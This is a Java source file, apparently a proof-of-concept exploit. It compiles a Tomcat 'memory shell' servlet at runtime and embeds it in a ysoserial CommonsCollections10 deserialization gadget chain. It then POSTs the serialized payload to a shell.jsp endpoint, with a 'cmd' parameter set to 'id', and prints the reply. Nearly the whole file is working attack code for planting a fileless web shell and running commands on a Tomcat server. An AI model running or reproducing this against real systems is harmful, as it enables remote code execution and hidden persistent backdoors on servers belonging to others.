package tomcat;

import myframework.HttpRequest;
import myframework.ReadWrite;
import myframework.ser.ClassFiles;
import myframework.ser.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.Eval;
import ysoserial.payloads.util.JavaCompiler;

public class UseJava {
    public static void main(String[] args) throws Exception{
        String url = "http://wsl.com:8080/tomcattest/shell.jsp";
        Object evil = poc();
        byte[] ser = Serializer.serialize(evil);

        byte[] resp = new HttpRequest(url).addHeader("cmd","id").addPostData(ser).addParam("cmd","id").send();
        System.out.println(new String(resp));
    }
    public static Object poc() throws Exception{
        String java = new String(ReadWrite.readResource(UseJava.class, "内存马/tomcat/ServletShell.java"));
        byte[] bytes = JavaCompiler.compile("ServletShell",java);
        Class c = ClassFiles.bytesAsClass(bytes);
        Object o = new Eval().getObject(CommonsCollections10.class,c);
        return o;
    }
}
